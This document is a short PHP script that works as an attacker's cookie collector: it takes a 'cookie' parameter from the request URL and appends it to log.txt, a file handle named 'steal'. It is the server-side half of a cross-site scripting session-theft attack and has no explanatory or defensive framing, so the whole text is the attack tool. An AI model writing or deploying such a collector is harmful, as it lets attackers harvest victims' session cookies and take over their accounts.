<?php
$cookie = $HTTP_GET_VARS["cookie"];
$steal = fopen("log.txt","a");
fwrite($steal, $cookie."\n");
fclose($steal);
?>
